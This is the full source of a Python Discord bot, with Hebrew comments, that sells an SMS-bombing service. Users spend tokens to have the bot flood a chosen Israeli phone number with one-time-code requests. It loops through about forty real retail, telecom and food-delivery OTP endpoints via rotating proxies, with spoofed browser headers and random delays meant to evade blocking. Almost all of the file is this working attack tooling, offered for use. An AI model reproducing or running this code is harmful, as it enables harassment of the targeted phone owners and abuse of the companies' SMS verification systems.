import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging

# --- הגדרות לוגים וחיבורים ל-Railway ---
logging.basicConfig(level=logging.INFO)

# Railway מספק את המשתנים האוטומטית
MONGO_URI = os.getenv("MONGO_URI")  # Railway יספק את זה אוטומטית מה-MongoDB plugin
TOKEN = os.getenv("DISCORD_TOKEN")  # צריך להגדיר ב-Railway Variables

# בדיקה שהמשתנים קיימים
if not MONGO_URI:
    logging.error("❌ MONGO_URI not found in environment variables!")
    sys.exit(1)

if not TOKEN:
    logging.error("❌ DISCORD_TOKEN not found in environment variables!")
    sys.exit(1)

# התחברות ל-MongoDB ב-Railway
try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]  # שם הדאטאבייס
    users_col = db["users"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

# רשימת ה-Proxies המלאה (נשארת אותו דבר)
FREE_ISRAEL_PROXIES = [
    "http://103.153.39.186:80", "http://185.162.231.228:80", "http://185.162.231.210:80",
    "http://103.153.39.154:80", "http://185.162.231.124:80", "http://185.162.231.122:80",
    "http://185.162.230.114:80", "http://185.162.230.112:80", "http://185.162.230.110:80",
    "http://185.162.230.108:80", "http://185.162.230.106:80", "http://185.162.230.104:80",
    "http://185.162.230.102:80", "http://185.162.230.100:80", "http://185.162.231.250:80",
    "http://185.162.231.248:80", "http://185.162.231.246:80", "http://185.162.231.244:80",
    "http://185.162.231.242:80", "http://185.162.231.240:80", "http://185.162.231.238:80",
    "http://185.162.231.236:80", "http://185.162.231.234:80", "http://185.162.231.232:80",
    "http://185.162.231.230:80", "http://185.162.231.228:80", "http://185.162.231.226:80",
    "http://185.162.231.224:80", "http://185.162.231.222:80", "http://185.162.231.220:80",
    "http://185.162.231.218:80", "http://185.162.231.216:80", "http://185.162.231.214:80",
    "http://185.162.231.212:80", "http://185.162.231.210:80", "http://185.162.231.208:80",
    "http://185.162.231.206:80", "http://185.162.231.204:80", "http://185.162.231.202:80",
    "http://185.162.231.200:80", "http://185.162.231.198:80", "http://185.162.231.196:80",
    "http://185.162.231.194:80", "http://185.162.231.192:80", "http://185.162.231.190:80",
    "http://185.162.231.188:80", "http://185.162.231.186:80", "http://185.162.231.184:80",
    "http://185.162.231.182:80", "http://185.162.231.180:80", "http://185.162.231.178:80",
    "http://185.162.231.176:80", "http://185.162.231.174:80", "http://185.162.231.172:80",
    "http://185.162.231.170:80", "http://185.162.231.168:80", "http://185.162.231.166:80",
    "http://185.162.231.164:80", "http://185.162.231.162:80", "http://185.162.231.160:80",
    "http://185.162.231.158:80", "http://185.162.231.156:80", "http://185.162.231.154:80",
    "http://185.162.231.152:80", "http://185.162.231.150:80", "http://185.162.231.148:80",
    "http://185.162.231.146:80", "http://185.162.231.144:80", "http://185.162.231.142:80",
    "http://185.162.231.140:80", "http://185.162.231.138:80", "http://185.162.231.136:80",
    "http://185.162.231.134:80", "http://185.162.231.132:80", "http://185.162.231.130:80",
    "http://185.162.231.128:80", "http://185.162.231.126:80", "http://185.162.231.124:80",
    "http://185.162.231.122:80", "http://185.162.231.120:80", "http://185.162.231.118:80",
    "http://185.162.231.116:80", "http://185.162.231.114:80", "http://185.162.231.112:80",
    "http://185.162.231.110:80", "http://185.162.231.108:80", "http://185.162.231.106:80",
    "http://185.162.231.104:80", "http://185.162.231.102:80", "http://185.162.231.100:80",
    "http://103.153.39.186:80", "http://103.153.39.154:80", "http://103.153.39.122:80",
    "http://103.153.39.90:80", "http://103.153.39.58:80", "http://103.153.39.26:80",
    "http://185.162.230.250:80", "http://185.162.230.248:80", "http://185.162.230.246:80",
    "http://185.162.230.244:80", "http://185.162.230.242:80", "http://185.162.230.240:80"
]

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.tree.on_error = self.on_app_command_error
        self.start_time = datetime.now()
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"🔱 OMNI-TOTAL-WAR BOT IS ONLINE - Synced all commands")
        logging.info(f"📊 Connected to {len(FREE_ISRAEL_PROXIES)} proxies")

    async def on_app_command_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError):
        if isinstance(error, app_commands.CommandOnCooldown):
            await interaction.response.send_message(f"⏰ המתן {error.retry_after:.1f} שניות", ephemeral=True)
        else:
            await interaction.response.send_message(f"❌ שגיאה: {str(error)}", ephemeral=True)
            logging.error(f"Command error: {error}")

bot = CyberBot()

# --- מנוע הזרקת ה-APIs ---
async def async_api_call(session, url, data, method="POST", is_json=True, params=None):
    proxy = random.choice(FREE_ISRAEL_PROXIES)
    headers = {
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(110,128)}.0.0.0 Safari/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json" if is_json else "application/x-www-form-urlencoded",
        "Origin": "https://www.google.com",
        "Referer": "https://www.google.com/"
    }
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with session.request(method, url, 
                                   json=data if is_json else None, 
                                   data=data if not is_json else None, 
                                   params=params, headers=headers, 
                                   proxy=proxy, timeout=timeout) as resp:
            return resp.status in [200, 201, 202, 204]
    except Exception as e:
        return False

async def run_total_war(phone, duration_mins, user_id):
    phone_intl = f"+972{phone[3:]}" if phone.startswith("972") else f"+972{phone[1:]}"
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    
    # מג'נטו מיוחד
    magento_data = {"type": "login", "telephone": phone_raw, "bot_validation": 1}
    
    end_time = datetime.now() + timedelta(minutes=duration_mins)
    rounds = 0
    total_hits = 0
    
    logging.info(f"🎯 Attack started - Phone: {phone}, Duration: {duration_mins}min, User: {user_id}")
    
    # בניית רשימת היעדים המלאה
    targets = [
        # --- APIs בסיסיים ---
        ("https://www.yad2.co.il/api/auth/register", {"phone": phone, "action": "send_sms"}, "POST", True),
        ("https://www.wolt.com/api/v1/verify", {"phone": phone}, "POST", True),
        ("https://payboxapp.com/api/auth/otp", {"phone": phone}, "POST", True),
        ("https://019sms.co.il/api/register", {"phone": phone}, "POST", True),
        ("https://www.cellcom.co.il/api/auth/sms", {"phone": phone}, "POST", True),
        ("https://www.partner.co.il/api/register", {"phone": phone}, "POST", True),
        ("https://www.hotmobile.co.il/api/verify", {"phone": phone}, "POST", True),
        ("https://www.pelephone.co.il/api/auth", {"phone": phone}, "POST", True),
        ("https://www.10bis.co.il/api/register", {"phone": phone}, "POST", True),
        ("https://www.dominos.co.il/api/auth/sms", {"phone": phone}, "POST", True),
        
        # --- QUICK-LOGIN CLUSTER ---
        ("https://oidc.quick-login.com/authorize", {"client_id": "quicklogin-twentyfourseven-israel", "phone_number": phone_intl, "lang": "he"}, "POST", True),
        ("https://oidc.quick-login.com/authorize", {"client_id": "quicklogin-renuar-israel", "phone_number": phone_intl, "lang": "he"}, "POST", True),
        ("https://oidc.quick-login.com/authorize", {"client_id": "quicklogin-aldoshoes-israel", "phone_number": phone_intl, "lang": "he"}, "POST", True),
        ("https://oidc.quick-login.com/authorize", {"client_id": "quicklogin-billabong-israel", "phone_number": phone_intl, "lang": "he"}, "POST", True),
        ("https://oidc.quick-login.com/authorize", {"client_id": "quicklogin-sacks-israel", "phone_number": phone_intl, "lang": "he"}, "POST", True),
        ("https://oidc.quick-login.com/authorize", {"client_id": "quicklogin-stevemadden-israel", "phone_number": phone_intl, "lang": "he"}, "POST", True),
        
        # --- MAGENTO CLUSTER ---
        ("https://www.castro.com/customer/ajax/post/", magento_data, "POST", False),
        ("https://www.hoodies.co.il/customer/ajax/post/", magento_data, "POST", False),
        ("https://www.urbanica-wh.com/customer/ajax/post/", magento_data, "POST", False),
        ("https://www.weshoes.co.il/customer/ajax/post/", magento_data, "POST", False),
        ("https://www.timberland.co.il/customer/ajax/post/", magento_data, "POST", False),
        
        # --- FOX GROUP ---
        ("https://api.foxhome.co.il/v1/auth/otp", {"phone": phone_raw}, "POST", True),
        ("https://api.terminalx.com/v1/auth/otp", {"phone": phone_raw}, "POST", True),
        ("https://api.laline.co.il/v1/auth/otp", {"phone": phone_raw}, "POST", True),
        
        # --- תחבורה ---
        ("https://api.pango.co.il/auth/otp", {"phoneNumber": phone_raw}, "POST", True),
        ("https://www.shufersal.co.il/api/v1/auth/otp", {"phone": phone_raw}, "POST", True),
        ("https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone_raw, "type": "phone", "projectId": "1"}, "POST", True),
        
        # --- רשתות אוכל נוספות ---
        ("https://www.mcdonalds.co.il/api/verify", {"phone": phone}, "POST", True),
        ("https://www.kfc.co.il/api/sms", {"phone": phone}, "POST", True),
        ("https://www.pizza-hut.co.il/api/register", {"phone": phone}, "POST", True),
        ("https://www.burgerking.co.il/api/auth", {"phone": phone}, "POST", True),
        
        # --- רשתות אופנה ---
        ("https://www.fox.co.il/api/verify", {"phone": phone}, "POST", True),
        ("https://www.adidas.co.il/api/verify", {"phone": phone}, "POST", True),
        ("https://www.nike.co.il/api/sms", {"phone": phone}, "POST", True),
        ("https://www.puma.co.il/api/register", {"phone": phone}, "POST", True),
        
        # --- פארם ---
        ("https://www.super-pharm.co.il/api/sms", {"phone": phone}, "POST", True),
        ("https://www.be.co.il/api/auth", {"phone": phone}, "POST", True),
        
        # --- השכרת רכב ---
        ("https://www.hertz.co.il/api/auth", {"phone": phone}, "POST", True),
        ("https://www.eldan.co.il/api/verify", {"phone": phone}, "POST", True),
        ("https://www.sixt.co.il/api/sms", {"phone": phone}, "POST", True),
        
        # --- אפליקציות תחבורה ---
        ("https://www.gett.com/il/api/verify", {"phone": phone}, "POST", True),
        ("https://www.uzer.co.il/api/sms", {"phone": phone}, "POST", True),
    ]
    
    async with aiohttp.ClientSession() as session:
        while datetime.now() < end_time:
            rounds += 1
            # שליחה אסינכרונית מסיבית
            tasks = [async_api_call(session, *t) for t in targets]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            successful = sum(1 for r in results if r is True)
            total_hits += successful
            
            if rounds % 6 == 0:  # כל דקה בערך
                logging.info(f"📊 Attack progress - Phone: {phone}, Round: {rounds}, Hits: {successful}/{len(targets)}, Total: {total_hits}")
            
            # המתנה בין גלים - משתנה כדי למנוע חסימה
            await asyncio.sleep(random.uniform(3, 7))
    
    logging.info(f"✅ Attack completed - Phone: {phone}, Total rounds: {rounds}, Total hits: {total_hits}")

# --- ממשק משתמש ---
class CyberView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.button(label="💣 הפעל מתקפה", style=discord.ButtonStyle.danger, emoji="⚡")
    async def launch_attack(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(LaunchModal())

class LaunchModal(ui.Modal, title="💣 OMNI TOTAL WAR - הפעל מתקפה"):
    phone = ui.TextInput(label="📱 טלפון (972...)", placeholder="972501234567")
    duration = ui.TextInput(label="⏱️ דקות", default="10", placeholder="5-30 דקות")

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        user_id = str(interaction.user.id)
        
        # וידוא פורמט מספר
        if not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב להתחיל ב-972", ephemeral=True)
            return
        
        try:
            duration = int(self.duration.value)
            if duration < 1 or duration > 60:
                await interaction.response.send_message("❌ משך חייב להיות בין 1-60 דקות", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ משך לא תקין", ephemeral=True)
            return
        
        # בדיקת טוקנים ב-DB
        user_doc = await users_col.find_one({"user_id": user_id})
        if not user_doc:
            # יצירת משתמש חדש עם 3 טוקני בונוס
            await users_col.insert_one({"user_id": user_id, "tokens": 3, "created_at": datetime.now()})
            user_doc = {"tokens": 3}
        
        if user_doc.get("tokens", 0) < 1:
            return await interaction.response.send_message("❌ אין טוקנים! השתמש ב-/setup לקבלת טוקנים", ephemeral=True)

        # הורדת טוקן
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
        
        # שליחת אישור
        embed = discord.Embed(title="🚀 TOTAL WAR ACTIVATED", color=0xff0000)
        embed.add_field(name="📱 טלפון", value=phone, inline=True)
        embed.add_field(name="⏱️ משך", value=f"{duration} דקות", inline=True)
        embed.add_field(name="🎯 יעדים", value=f"{len(targets_list)} APIs", inline=True)
        embed.add_field(name="🌊 גלים", value=f"~{duration * 12}", inline=True)
        embed.add_field(name="💎 טוקנים נותרים", value=user_doc.get("tokens", 0) - 1, inline=True)
        embed.set_footer(text="התקפה רצה ברקע • תודה שבחרת ב-OMNI TOTAL WAR")
        
        await interaction.response.send_message(embed=embed, ephemeral=True)
        
        # הפעלת המתקפה ברקע
        asyncio.create_task(run_total_war(phone, duration, user_id))
        await interaction.followup.send("✅ המתקפה הופעלה בהצלחה!", ephemeral=True)

# רשימת היעדים לסטטיסטיקה
targets_list = [
    "Yad2", "Wolt", "PayBox", "019", "Cellcom", "Partner", "Hot", "Pelephone",
    "10bis", "Dominos", "QuickLogin x5", "Magento x5", "Fox Group x3",
    "Pango", "Shufersal", "Hamal", "McDonalds", "KFC", "PizzaHut", "BurgerKing",
    "Adidas", "Nike", "Puma", "SuperPharm", "Hertz", "Eldan", "Sixt", "Gett", "Uzer"
]

@bot.tree.command(name="setup", description="הפעל את הפאנל הראשי")
async def setup(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    
    # בדיקה אם המשתמש קיים, אם לא - יצירה עם טוקנים
    user_doc = await users_col.find_one({"user_id": user_id})
    if not user_doc:
        await users_col.insert_one({"user_id": user_id, "tokens": 5, "created_at": datetime.now()})
        tokens = 5
    else:
        tokens = user_doc.get("tokens", 0)
    
    # יצירת הפאנל
    embed = discord.Embed(title="⚡ OMNI TOTAL WAR - פאנל שליטה", color=0x00ff00)
    embed.add_field(name="💎 הטוקנים שלך", value=f"**{tokens}**", inline=True)
    embed.add_field(name="🎯 יעדים זמינים", value=f"**{len(targets_list)}** APIs", inline=True)
    embed.add_field(name="👤 משתמש", value=interaction.user.mention, inline=True)
    embed.add_field(name="📊 סטטוס", value="✅ פעיל", inline=True)
    embed.add_field(name="⚡ עוצמה", value="מקסימלית", inline=True)
    embed.add_field(name="🛡️ Proxies", value=f"**{len(FREE_ISRAEL_PROXIES)}**", inline=True)
    embed.set_footer(text="לחץ על הכפתור להפעלת מתקפה")
    
    view = CyberView()
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name="tokens", description="בדוק כמה טוקנים יש לך")
async def check_tokens(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    
    if not user_doc:
        tokens = 0
    else:
        tokens = user_doc.get("tokens", 0)
    
    embed = discord.Embed(title="💎 מאזן טוקנים", color=0x00ff00)
    embed.add_field(name="טוקנים זמינים", value=f"**{tokens}**", inline=True)
    embed.add_field(name="משתמש", value=interaction.user.mention, inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="add_tokens", description="הוסף טוקנים למשתמש (למנהלים בלבד)")
@app_commands.default_permissions(administrator=True)
async def add_tokens(interaction: discord.Interaction, member: discord.Member, amount: int):
    user_id = str(member.id)
    await users_col.update_one(
        {"user_id": user_id}, 
        {"$inc": {"tokens": amount}},
        upsert=True
    )
    
    embed = discord.Embed(title="✅ טוקנים נוספו", color=0x00ff00)
    embed.add_field(name="משתמש", value=member.mention, inline=True)
    embed.add_field(name="כמות", value=f"+{amount}", inline=True)
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="stats", description="סטטיסטיקות בוט")
async def stats(interaction: discord.Interaction):
    total_users = await users_col.count_documents({})
    total_tokens = 0
    async for user in users_col.find({}):
        total_tokens += user.get("tokens", 0)
    
    uptime = datetime.now() - bot.start_time
    hours = uptime.seconds // 3600
    minutes = (uptime.seconds % 3600) // 60
    
    embed = discord.Embed(title="📊 סטטיסטיקות בוט", color=0x00ff00)
    embed.add_field(name="👥 משתמשים", value=total_users, inline=True)
    embed.add_field(name="💎 סך טוקנים", value=total_tokens, inline=True)
    embed.add_field(name="🛡️ Proxies", value=len(FREE_ISRAEL_PROXIES), inline=True)
    embed.add_field(name="⏰ זמן פעילות", value=f"{hours}ש {minutes}ד", inline=True)
    embed.add_field(name="🎯 APIs", value=len(targets_list), inline=True)
    embed.add_field(name="🌐 חיבור DB", value="✅ פעיל", inline=True)
    
    await interaction.response.send_message(embed=embed)

if __name__ == "__main__":
    logging.info("🚀 Starting OMNI TOTAL WAR BOT on Railway...")
    bot.run(TOKEN)
